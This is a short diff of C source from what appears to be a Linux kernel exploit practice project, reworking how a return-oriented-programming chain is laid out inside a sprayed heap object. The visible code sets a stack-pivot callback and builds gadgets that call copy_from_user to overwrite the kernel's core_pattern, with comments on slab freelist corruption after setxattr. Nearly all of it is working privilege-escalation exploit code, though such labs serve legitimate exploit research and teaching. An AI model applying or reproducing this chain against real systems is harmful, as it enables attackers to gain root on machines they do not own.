@@ -120,30 +120,29 @@ int run_sh(void)
 	return EXIT_SUCCESS;
 }
 
-static const unsigned long rop_chain[0x60] = {
-	/* free slot */ [0] =  0x01UL,
-	/* hole */ [1] = 0x01UL,
-	[2]  = POP_RDX_POP_RDI,
-	[3]  = 0x30, /* => rdx */
-	[4]  = CORE_PATTERN_PTR,
-	[5]  = POP_RSI,
-	/* hole => dummy rsi */ [6] = 0x01UL,
-	[7]  = POP_RSI,
-	[8]  = (unsigned long)&fake_core_pattern,
-	[9]  = COPY_FROM_USER_PTR,
-	[10] = MSLEEP_PTR,
-	/* corrupted slot */ [11] = 0x01UL
-};
-
 void init_payload(char *p, size_t size)
 {
 	struct drill_item_t *item = (struct drill_item_t *)p;
+	unsigned long *rop_chain_2 = (unsigned long *)item->data;
+	unsigned long offset = 0;
 
 	memset(p, 0x41, size);
-	/* place 2nd set of gadgets at the drill_item_t */
-	memcpy(p, rop_chain, sizeof(rop_chain));
 
 	item->callback = (void (*)(void))STACKPIVOT_GADGET_PTR;
+
+	rop_chain_2[offset++] = POP_RDX_POP_RDI;
+	rop_chain_2[offset++] = 0x30; /* the value for rdx, function parameter #3 */
+	rop_chain_2[offset++] = CORE_PATTERN_PTR; /* the value for rdi, function parameter #1 */
+	rop_chain_2[offset++] = POP_RSI;
+	rop_chain_2[offset++] = 0x42; /* dummy value that will be corrupted by a slab freelist ptr,
+					 which is written at the offset 0x30 from the beginning
+					 of the slab chunk (setxattr() frees the sprayed object
+					 shortly after its allocation) */
+	rop_chain_2[offset++] = POP_RSI;
+	rop_chain_2[offset++] = (unsigned long)fake_core_pattern; /* the value for rsi,
+								     function parameter #2 */
+	rop_chain_2[offset++] = COPY_FROM_USER_PTR;
+	rop_chain_2[offset++] = MSLEEP_PTR;
 
 	printf("[+] payload:\n");
 	printf("\tstart at %p\n", p);
